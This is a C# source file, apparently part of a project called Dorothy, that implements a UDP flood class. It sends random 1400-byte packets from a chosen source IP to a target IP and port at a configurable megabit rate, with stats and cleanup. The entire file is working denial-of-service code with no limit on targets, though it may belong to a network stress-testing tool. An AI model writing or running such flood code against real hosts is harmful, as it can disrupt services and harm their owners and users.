using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Threading.Tasks;
using System.Diagnostics;
using NLog;

namespace Dorothy.Models
{
    public class UdpFlood : IDisposable
    {
        private static readonly ILogger Logger = LogManager.GetCurrentClassLogger();
        private volatile bool _isRunning;
        private readonly string _targetIp;
        private readonly string _sourceIp;
        private readonly int _targetPort;
        private readonly long _targetMbps;
        private long _totalPacketsSent;
        private readonly Stopwatch _stopwatch;
        private Socket? _socket;
        private readonly CancellationToken _cancellationToken;
        public const int PACKET_SIZE = 1400;

        public UdpFlood(string sourceIp, string targetIp, int targetPort, long targetMbps, CancellationToken cancellationToken)
        {
            _sourceIp = sourceIp ?? throw new ArgumentNullException(nameof(sourceIp));
            _targetIp = targetIp ?? throw new ArgumentNullException(nameof(targetIp));
            _targetPort = targetPort;
            _targetMbps = targetMbps;
            _cancellationToken = cancellationToken;
            _stopwatch = new Stopwatch();
            _isRunning = false;
            _totalPacketsSent = 0;
        }

        public async Task StartAsync()
        {
            if (_isRunning) return;
            
            try
            {
                _socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
                var localEndPoint = new IPEndPoint(IPAddress.Parse(_sourceIp), 0);
                _socket.Bind(localEndPoint);
                
                var targetEndPoint = new IPEndPoint(IPAddress.Parse(_targetIp), _targetPort);
                _isRunning = true;
                _stopwatch.Start();
                
                var buffer = new byte[PACKET_SIZE];
                new Random().NextBytes(buffer);
                
                var bitsPerSecond = _targetMbps * 1_000_000;
                var packetsPerSecond = bitsPerSecond / (PACKET_SIZE * 8);
                var packetsPerBatch = Math.Max(1000, packetsPerSecond / 100);
                var batchIntervalMs = 10;
                
                Logger.Info($"Starting UDP flood from {_sourceIp} to {_targetIp}:{_targetPort}, Rate: {_targetMbps} Mbps");
                
                while (_isRunning && !_cancellationToken.IsCancellationRequested)
                {
                    var batchStart = DateTime.UtcNow;
                    
                    for (int i = 0; i < packetsPerBatch && _isRunning; i++)
                    {
                        _socket.SendTo(buffer, SocketFlags.None, targetEndPoint);
                        Interlocked.Increment(ref _totalPacketsSent);
                    }
                    
                    var elapsed = (DateTime.UtcNow - batchStart).TotalMilliseconds;
                    if (elapsed < batchIntervalMs)
                    {
                        await Task.Delay((int)(batchIntervalMs - elapsed), _cancellationToken);
                    }
                }
            }
            catch (Exception ex)
            {
                Logger.Error(ex, "Error in UDP flood");
                throw;
            }
        }

        public (double currentMbps, long packetsSent) GetStats()
        {
            var elapsedSeconds = _stopwatch.Elapsed.TotalSeconds;
            if (elapsedSeconds == 0) return (0, 0);
            
            var currentPackets = Interlocked.Read(ref _totalPacketsSent);
            var currentMbps = (currentPackets * PACKET_SIZE * 8.0) / (elapsedSeconds * 1_000_000);
            return (currentMbps, currentPackets);
        }

        public void Stop()
        {
            if (!_isRunning) return;
            
            try
            {
                _isRunning = false;
                _stopwatch.Stop();
            }
            catch (Exception ex)
            {
                Logger.Error(ex, "Error stopping UDP flood");
            }
        }

        public void Dispose()
        {
            if (_isRunning)
            {
                Stop();
            }
            
            try
            {
                if (_socket != null)
                {
                    try
                    {
                        _socket.Shutdown(SocketShutdown.Both);
                    }
                    catch { }
                    
                    try
                    {
                        _socket.Close();
                        _socket.Dispose();
                    }
                    catch (Exception ex)
                    {
                        Logger.Error(ex, "Error disposing socket");
                    }
                    finally
                    {
                        _socket = null;
                    }
                }
            }
            catch (Exception ex)
            {
                Logger.Error(ex, "Error in UDP flood dispose");
            }
        }
    }
} 